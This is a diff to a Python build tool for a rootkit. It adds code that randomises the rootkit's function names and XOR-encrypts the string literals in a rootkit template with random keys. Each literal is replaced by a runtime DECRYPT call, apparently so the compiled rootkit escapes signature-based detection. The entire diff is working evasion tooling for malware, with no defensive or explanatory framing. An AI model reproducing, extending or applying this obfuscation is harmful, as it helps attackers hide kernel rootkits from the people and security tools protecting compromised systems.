@@ -4,9 +4,10 @@ import os
 import re
 import random
 import string
+import secrets
 
 
-class Obfuscator:
+class FilesAndFunctions:
 
     def __init__(self):
         self.var_map = {}
@@ -16,6 +17,7 @@ class Obfuscator:
         self.header_regex = re.compile("^[^/].* [ *(-]*(?P<var>[a-zA-Z0-9_]+)[ *)-]*(\(|{)+.*")
 
         self.var_map["init_rootkit"] = self.random_string()
+        self.var_map["runner"] = self.random_string()
         self.var_map["clear_rootkit"] = self.random_string()
         self.var_map["rootkit_example_init"] = self.random_string()
         self.var_map["rootkit_example_exit"] = self.random_string()
@@ -83,6 +85,10 @@ class Obfuscator:
 
 
         for line in data:
+            if file == "rootkit/core.h":
+                new_file_content += line
+                continue
+
             if header:
                 match = self.header_regex.match(line)
                 if match:
@@ -118,3 +124,69 @@ class Obfuscator:
         else:
             with open(file_base+"/"+new_file, 'w') as f:
                 f.write(new_file_content)
+
+class Strings:
+    def __init__(self):
+        self.strings = {}
+        self.strings["enc"] = {}
+        self.strings["key"] = {}
+
+        with open("rootkit_files/rootkit_template.j2","r") as file:
+            for line in file:
+                if re.search("^[^#][^/]*\"[^\"]*\"", line) and not re.search("MODULE_", line):
+                    data = re.findall("\"([^\"]*)\"", line)
+                    for x in data:
+                        if not re.search("{{.*}}", x) and x != "":
+                            self.strings["enc"][x] = bytearray(x.encode())
+                            self.strings["key"][x] = ""
+
+    def setAdditional(self, d):
+        self.additional = []
+        self.iterData(d)
+        for x in self.additional:
+            self.strings["enc"][x] = bytearray(x.encode())
+            self.strings["key"][x] = ""
+
+    def iterData(self, d):
+        if isinstance(d, dict):
+            for k,v in d.items():
+                if isinstance(v, dict):
+                    self.iterData(v)
+                elif isinstance(v, list):
+                    self.iterData(v)
+                elif isinstance(v, str):
+                    self.additional.append(v)
+        else:
+            for v in d:
+                if isinstance(v, dict):
+                    self.iterData(v)
+                elif isinstance(v, list):
+                    self.iterData(v)
+                elif isinstance(v, str):
+                    self.additional.append(v)
+
+
+    def getStrings(self):
+        return self.strings
+
+    def start(self):
+        for x in self.strings["enc"]:
+            key = secrets.token_bytes(16)
+            self.strings["key"][x] = ''.join(['\\x'+hex(c)[2:] for c in key])
+            self.strings["enc"][x] = ''.join(['\\x'+hex(c)[2:] for c in bytes(self.xor(self.strings["enc"][x], key))])
+
+    def xor(self, data, key):
+        l = len(key)
+        return bytearray((
+            (data[i] ^ key[i % l]) for i in range(0,len(data))
+        ))
+
+    def rewrite(self, data):
+        ret = ""
+        for line in data.splitlines():
+            for k, v in self.strings["enc"].items():
+                if k in line:
+                    replace = "DECRYPT(\""+re.escape(v)+"\", \""+re.escape(self.strings["key"][k])+"\")"
+                    line = re.sub("\""+k+"\"", replace, line)
+            ret += line + "\n"
+        return ret
